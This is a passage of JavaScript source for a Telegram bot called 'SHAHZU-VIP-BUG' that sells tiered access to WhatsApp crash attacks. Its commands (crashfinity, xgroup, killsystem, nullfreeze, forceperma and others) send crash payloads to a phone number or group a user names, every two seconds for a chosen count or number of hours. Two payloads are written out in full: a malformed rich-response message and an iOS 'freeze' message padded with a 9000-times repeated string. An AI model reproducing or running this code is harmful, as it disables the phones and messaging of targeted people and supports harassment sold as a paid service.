            const targetGid=args[1];
            const duration=args[2]||'30d';
            if(!targetGid) return S7.sendMessage(chatId, 'Usage: /addgsvip <groupId> [duration]');
            const m=duration.match(/^(\d+)d$/i);
            if(!m) return S7.sendMessage(chatId, 'Invalid duration, use 30d');
            const days=parseInt(m[1]);
            const exp=Date.now()+days*24*60*60*1000;
            if(!db.groupSvip) db.groupSvip={};
            db.groupSvip[targetGid]=exp;
            saveDB(db);
            const expStr=new Date(exp).toLocaleString('en-US',{timeZone:'Asia/Jakarta',dateStyle:'long',timeStyle:'short'});
            S7.sendMessage(chatId, `💎 <b>Group SVIP Added</b>\n\nGroup: <code>${targetGid}</code>\nDuration: ${days} days\nExpired: ${expStr}\n\n✅ Group members get SVIP (Global Sender) access!`,{parse_mode:'HTML'});
        });
        SYLoVe(['delgsvip','delgroupsvip'], (msg)=>{
            const chatId=msg.chat.id.toString();
            const userId=msg.from.id.toString();
            if (userId !== config.adminId && chatId !== config.adminId) return S7.sendMessage(chatId, notauthorized);
            let db=getDB();
            if(!LoveGlobalState(userId,chatId)) return sendSYLove(S7,chatId);
            const targetGid=msg.text.split(' ')[1];
            if(!targetGid) return S7.sendMessage(chatId, 'Usage: /delgsvip <groupId>');
            if(!db.groupSvip || !db.groupSvip[targetGid]) return S7.sendMessage(chatId, 'Group not SVIP.');
            delete db.groupSvip[targetGid];
            saveDB(db);
            S7.sendMessage(chatId, `🗑️ Group <code>${targetGid}</code> removed from SVIP.`,{parse_mode:'HTML'});
        });
        SYLoVe(['listgprem','listgroupprem'], async (msg)=>{
            const chatId=msg.chat.id.toString();
            const userId=msg.from.id.toString();
            if (userId !== config.adminId && chatId !== config.adminId) return S7.sendMessage(chatId, notauthorized);
            if(!LoveGlobalState(userId,chatId)) return sendSYLove(S7,chatId);
            const db=getDB();
            const gp=db.groupPremium||{};
            const gs=db.groupSvip||{};
            if(Object.keys(gp).length===0 && Object.keys(gs).length===0) return S7.sendMessage(chatId, 'No Group Premium/SVIP found.');
            let text='🏆 <b>Group Premium List</b>\n\n';
            for(const gid of Object.keys(gp)){
                const exp=new Date(gp[gid]).toLocaleDateString('en-GB',{timeZone:'Asia/Jakarta'});
                text+=`• <code>${gid}</code> — Premium ⏳ ${exp}\n`;
            }
            text+='\n💎 <b>Group SVIP List</b>\n\n';
            for(const gid of Object.keys(gs)){
                const exp=new Date(gs[gid]).toLocaleDateString('en-GB',{timeZone:'Asia/Jakarta'});
                text+=`• <code>${gid}</code> — SVIP ⏳ ${exp}\n`;
            }
            S7.sendMessage(chatId, text, {parse_mode:'HTML'});
        });
        // ===== UTILITY: ID & ACCESS CHECK =====
        SYLoVe(['id','myid','cekid','groupid2'], async (msg)=>{
            const chatId=msg.chat.id.toString();
            const userId=msg.from.id.toString();
            const chatType=msg.chat.type;
            let out=`🆔 <b>IDs</b>\n\n`;
            out+=`👤 Your User ID: <code>${userId}</code>\n`;
            out+=`💬 Chat ID: <code>${chatId}</code>\n`;
            out+=`📝 Chat Type: <code>${chatType}</code>\n`;
            if(msg.chat.title) out+=`🏷️ Title: ${msg.chat.title}\n`;
            if(msg.reply_to_message) out+=`↩️ Reply User ID: <code>${msg.reply_to_message.from.id}</code>\n`;
            out+=`\n<i>Use Chat ID for /addgprem /addgsvip</i>`;
            S7.sendMessage(chatId, out, {parse_mode:'HTML'});
        });
        SYLoVe(['myaccess','cekaccess','access','statusme'], async (msg)=>{
            const chatId=msg.chat.id.toString();
            const userId=msg.from.id.toString();
            const tier=getUserTier(userId);
            const tierName=GetSYLoVe(userId);
            const db=getDB();
            let txt=`🔐 <b>Your Access Status</b>\n\n`;
            txt+=`👤 ID: <code>${userId}</code>\n`;
            txt+=`🏷️ Tier: <b>${tierName}</b>\n`;
            txt+=`📊 Level: ${tier} (${getTierName(tier)})\n`;
            txt+=`🌐 Global Sender: <b>${canUseGlobal(userId)?'YES ✅':'NO ❌'}</b>\n`;
            txt+=`━━━━━━━━━━━━━━━\n`;
            if(db.svip.includes(userId)){
                const exp=db.svipExpiry[userId]? new Date(db.svipExpiry[userId]).toLocaleString('en-GB',{timeZone:'Asia/Jakarta'}):'Permanent';
                txt+=`💎 SVIP Exp: ${exp}\n`;
            }
            if(db.premium.includes(userId)){
                const exp=db.premiumExpiry[userId]? new Date(db.premiumExpiry[userId]).toLocaleString('en-GB',{timeZone:'Asia/Jakarta'}):'Permanent';
                txt+=`⭐ Premium Exp: ${exp}\n`;
            }
            if(db.resellers.includes(userId)) txt+=`🏆 Reseller: Permanent\n`;
            if(chatId && (db.groupPremium[chatId]||db.groupSvip[chatId])){
                const exp=db.groupPremium[chatId]||db.groupSvip[chatId];
                txt+=`🏆 Group Premium: ${new Date(exp).toLocaleDateString()}\n`;
            }
            const avail=getAvailableSenders(chatId,userId);
            txt+=`\n📱 Available Senders: <b>${avail.length}</b>\n`;
            txt+=`🌍 Global Pool: <b>${getGlobalSenders().length}</b>\n`;
            if(tier>=3) txt+=`\n<i>✨ SVIP perks: No need to /reqpair, borrow any sender!</i>\n`;
            else if(tier>=2) txt+=`\n<i>💡 Upgrade to SVIP to use Global Senders without pairing.</i>\n`;
            else txt+=`\n<i>🔒 Free: Pair your own with /reqpair</i>\n`;
            S7.sendMessage(chatId, txt, {parse_mode:'HTML'});
        });
        SYLoVe(['global','globalsender','togglobal'], (msg)=>{
            const chatId=msg.chat.id.toString();
            const userId=msg.from.id.toString();
            if(userId!==config.adminId) return S7.sendMessage(chatId, notauthorized);
            const _arg=msg.text.split(' ')[1]; const arg=_arg && _arg.toLowerCase();
            let db=getDB();
            if(arg==='on' || arg==='enable'){ db.globalSender=true; saveDB(db); return S7.sendMessage(chatId, '✅ Global Sender <b>ENABLED</b> — Premium now can also use global senders.',{parse_mode:'HTML'}); }
            if(arg==='off' || arg==='disable'){ db.globalSender=false; saveDB(db); return S7.sendMessage(chatId, '❌ Global Sender <b>DISABLED</b> — Only SVIP/Reseller/Owner can use global.',{parse_mode:'HTML'}); }
            S7.sendMessage(chatId, `🌐 Global Sender: <b>${db.globalSender?'ENABLED ✅':'DISABLED ❌'}</b>\n\nUsage: /global on | off`, {parse_mode:'HTML'});
        });
        SYLoVe(['help','bantuan','commands'], async (msg)=>{
            const chatId=msg.chat.id.toString();
            const uptime=getRuntime();
            const txt=`<blockquote><b>📚 SHAHZU-VIP-BUG — HELP</b></blockquote>
<blockquote><b>🆔 Utility</b>
/id — check IDs
/myaccess — your tier & expiry
/listsender — sender counts
/listgc — your groups
/groupid — get WA group ID
</blockquote>
<blockquote><b>⭐ Premium/SVIP</b>
/addprem ID 30d — add premium
/delprem ID
/listprem
/addsvip ID 30d — <b>SVIP (Global Sender)</b>
/delsvip ID
/listsvip
</blockquote>
<blockquote><b>🏆 Group Premium</b>
/addgprem groupId 30d
/delgprem groupId
/addgsvip groupId 30d
/delgsvip groupId
/listgprem
</blockquote>
<blockquote><b>📱 Sender</b>
/reqpair 62xxx — pair
/delpair 62xxx
/listsender
/delsender all
</blockquote>
<blockquote><b>📢 Broadcast</b>
/broadcast msg — TG broadcast
/bcgroup msg — WA to all groups
</blockquote>
<blockquote><b>💥 Bug Menu (/bug_menu)</b>
All bugs now support <b>Global Senders</b> for SVIP/GroupPremium
/free users need own pair
</blockquote>
<i>Online: ${uptime}</i>`;
            S7.sendMessage(chatId, txt, {parse_mode:'HTML'});
        });
      
                                        SYLoVe('crashfinity', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const targetNum = args[1];
            
            const s7CM = args[0].replace('/', '/').replace('.', ''); 

            if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
    const _senders = getAvailableSenders(chatId, userId);
    if (!_senders || _senders.length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Sender available.\n\n<b>Own:</b> use /reqpair to pair your number\n<b>SVIP/GroupPremium:</b> can use Global Senders automatically (no pair needed).\n\nTotal Global Senders: '+getGlobalSenders().length, {
            parse_mode: 'HTML'
            });
    }

            if (!targetNum) {
                return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: ${s7CM} +919876543210`, {
            parse_mode: 'HTML'            
            });
            }

            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;
            const randomSession = _senders[Math.floor(Math.random() * _senders.length)];
            const client = randomSession.sock;
            const senderNum = randomSession.num;

            try {

                log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
                
                if (typeof CrashLogic.crashfinity === 'function') {
                    await CrashLogic.crashfinity(client, targetJid);
                } else {
                    throw new Error(`Function not found in ${s7CM}.js`);
                }

                const SYLoves = BvgSYLoVe(cleanTarget)                                
                await S7.sendPhoto(chatId, botConfig.logo, { 
                    caption: SYLoves,
                    parse_mode: 'HTML'
                });

            } catch (err) {
                log('error', `${s7CM}`, err.message);
                S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
            }
        });
        
async function Rajufcrich(client, targetJid) {
    try {
        await client.relayMessage(targetJid, {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 1,
                        submessages: [
                            {
                                messageType: 8,
                                latexMetadata: {
                                    text: "SHAHZU-VIP-BUG"
                                }
                            },
                            {
                                messageType: 4,
                                tableMetadata: {
                                    title: "\0",
                                    rows: [
                                        {
                                            items: [],
                                            isHeading: false
                                        }
                                    ]
                                }
                            }
                        ],
                        contextInfo: {
                            forwardingScore: 99999,
                            isForwarded: true,
                            forwardedAiBotMessageInfo: {
                                botJid: "867051314767696@bot"
                            },
                            forwardOrigin: 4
                        }
                    }
                }
            }
        }, {});
    } catch (e) {
        console.log(`[Rajufcrich] error: ${e.message}`);
    }
}

async function FrezeIOS(sock, groupJid) {
    const IosFrezz = {
        viewOnceMessage: {
            message: {
                buttonsMessage: {
                    locationMessage: {
                        degreesLongitude: 0,
                        degreesLatitude: 0,
                        jpegThumbnail: null,
                        name: "𑇂𑆵𑆴𑆿".repeat(9000)
                    },
                    contentText: "x",
                    buttons: [{
                        buttonId: "x",
                        buttonText: {
                            displayText: "𑇂𑆵𑆴𑆿".repeat(9000)
                        },
                        type: 1
                    }],
                    headerType: 6
                }
            }
        }
    };
    const MakLu = generateWAMessageFromContent(groupJid, IosFrezz, {});
    await sock.relayMessage(groupJid, MakLu.message, {
        messageId: MakLu.key.id
    });
}

SYLoVe(['xgroup', 'groupui'], async (msg) => {
    try {
        const chatId = msg.chat.id.toString();
        const userId = msg.from.id.toString();
        const args = msg.text.split(' ');

        const s7CM = args[0].replace('/', '/').replace('.', '');
        const targetNum = args[1];

        if (!LoveGlobalState(userId, chatId)) {
            return sendSYLove(S7, chatId);
        }

        const _senders = getAvailableSenders(chatId, userId);
        if (!_senders || _senders.length === 0) {
            return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Sender available.\n\n<b>Own:</b> use /reqpair to pair your number\n<b>SVIP/GroupPremium:</b> can use Global Senders automatically (no pair needed).\n\nTotal Global Senders: '+getGlobalSenders().length, { parse_mode: 'HTML' });
        }

        if (!targetNum) {
            return S7.sendMessage(
                chatId,
                `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a GC JID.\nExample: /${s7CM} 120363410329068356@g.us`,
                { parse_mode: 'HTML' }
            );
        }

        if (!targetNum.endsWith('@g.us')) {
            return S7.sendMessage(
                chatId,
                '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid group JID',
                { parse_mode: 'HTML' }
            );
        }

        const targetJid = targetNum.trim();

        const randomSession = _senders[Math.floor(Math.random() * _senders.length)];
        const client = randomSession.sock;
        const senderNum = randomSession.num;

        log(
            'command',
            msg.from.first_name,
            `Calling ${s7CM} on ${targetJid} via ${senderNum} [${getUserTier(userId)>=3?'GLOBAL':'OWN'}]`
        );

        const SYLovesCap = BvgSYLoVe(targetJid);

        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLovesCap,
            parse_mode: 'HTML'
        });

        // Freeze IOS - Global Sender support
        try {
            if (typeof FrezeIOS === 'function') {
                await FrezeIOS(client, targetJid);
                await FrezeIOS(client, targetJid);
                await FrezeIOS(client, targetJid);
            }
        } catch (err) {
            console.log(`[xgroup FrezeIOS] error: ${err.message}`);
        }

    } catch (err) {
        log('error', 'xgroup', err.message);
        await S7.sendMessage(
            msg.chat.id,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`,
            { parse_mode: 'HTML' }
        );
    }
});

SYLoVe(['crashdroid', 'killsystem'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
    const _senders = getAvailableSenders(chatId, userId);
    if (!_senders || _senders.length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Sender available.\n\n<b>Own:</b> use /reqpair to pair your number\n<b>SVIP/GroupPremium:</b> can use Global Senders automatically (no pair needed).\n\nTotal Global Senders: '+getGlobalSenders().length, {
            parse_mode: 'HTML'
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = _senders[Math.floor(Math.random() * _senders.length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await killsystemLogic.killsystem(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[killsystem only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await killsystemLogic.killsystem(client, targetJid);
                } catch (err) {
                    console.log(`[killsystem time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe(['nullfreeze'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
    const _senders = getAvailableSenders(chatId, userId);
    if (!_senders || _senders.length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Sender available.\n\n<b>Own:</b> use /reqpair to pair your number\n<b>SVIP/GroupPremium:</b> can use Global Senders automatically (no pair needed).\n\nTotal Global Senders: '+getGlobalSenders().length, {
            parse_mode: 'HTML'
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = _senders[Math.floor(Math.random() * _senders.length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await nullfreezeLogic.nullfreeze(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[nullfreeze only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await nullfreezeLogic.nullfreeze(client, targetJid);
                } catch (err) {
                    console.log(`[nullfreeze time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe(['forceandro'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
    const _senders = getAvailableSenders(chatId, userId);
    if (!_senders || _senders.length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Sender available.\n\n<b>Own:</b> use /reqpair to pair your number\n<b>SVIP/GroupPremium:</b> can use Global Senders automatically (no pair needed).\n\nTotal Global Senders: '+getGlobalSenders().length, {
            parse_mode: 'HTML'
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = _senders[Math.floor(Math.random() * _senders.length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await forceandroLogic.forceandro(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[forceandro only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await forceandroLogic.forceandro(client, targetJid);
                } catch (err) {
                    console.log(`[forceandro time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe(['forceperma'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');
    const s7CM = args[0].replace('/', '/').replace('.', ''); 
    if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
    const _avail = getAvailableSenders(chatId, userId);
    if (!_avail || _avail.length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Sender available. Premium: pair with /reqpair | SVIP/GroupPremium: uses Global Senders (no pair needed).', { parse_mode: 'HTML' });
    }
    if (args.length < 3) {
        return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, { parse_mode: 'HTML' });
    }
    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;
    const randomSession = _avail[Math.floor(Math.random() * _avail.length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;
    const forcePerma = require(SYLoves + 'forceperma');
    try {
        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum} [${getUserTier(userId)>=3?'GLOBAL':'OWN'}]`);
        const SYLovesCap = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, { caption: SYLovesCap, parse_mode: 'HTML' });
        const delayMs = 2000;
        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', { parse_mode: 'HTML' });
            let sent = 0;
            const interval = setInterval(async () => {
                if (sent >= count) { clearInterval(interval); return; }
                try { await forcePerma.FcPerma(client, targetJid); sent++; } catch (err) { console.log(`[forceperma only] error: ${err.message}`); }
            }, delayMs);
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', { parse_mode: 'HTML' });
            const endTime = Date.now() + hours * 60 * 60 * 1000;
            const interval = setInterval(async () => {
                if (Date.now() >= endTime) { clearInterval(interval); return; }
                try { await forcePerma.FcPerma(client, targetJid); } catch (err) { console.log(`[forceperma time] error: ${err.message}`); }
            }, delayMs);
        }
    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, { parse_mode: 'HTML' });
    }
});

SYLoVe(['delaynull'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
    const _senders = getAvailableSenders(chatId, userId);
    if (!_senders || _senders.length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Sender available.\n\n<b>Own:</b> use /reqpair to pair your number\n<b>SVIP/GroupPremium:</b> can use Global Senders automatically (no pair needed).\n\nTotal Global Senders: '+getGlobalSenders().length, {
            parse_mode: 'HTML'
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = _senders[Math.floor(Math.random() * _senders.length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await delaynullLogic.delaynull(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[delaynull only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await delaynullLogic.delaynull(client, targetJid);
                } catch (err) {
                    console.log(`[delaynull time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe(['ghostdelay'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
    const _senders = getAvailableSenders(chatId, userId);
    if (!_senders || _senders.length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Sender available.\n\n<b>Own:</b> use /reqpair to pair your number\n<b>SVIP/GroupPremium:</b> can use Global Senders automatically (no pair needed).\n\nTotal Global Senders: '+getGlobalSenders().length, {
            parse_mode: 'HTML'
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = _senders[Math.floor(Math.random() * _senders.length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await ghostdelayLogic.ghostdelay(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[killsystem only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await ghostdelayLogic.ghostdelay(client, targetJid);
                } catch (err) {
                    console.log(`[ghostdelay time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe(['forcehard'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
    const _senders = getAvailableSenders(chatId, userId);
    if (!_senders || _senders.length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Sender available.\n\n<b>Own:</b> use /reqpair to pair your number\n<b>SVIP/GroupPremium:</b> can use Global Senders automatically (no pair needed).\n\nTotal Global Senders: '+getGlobalSenders().length, {
            parse_mode: 'HTML'
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
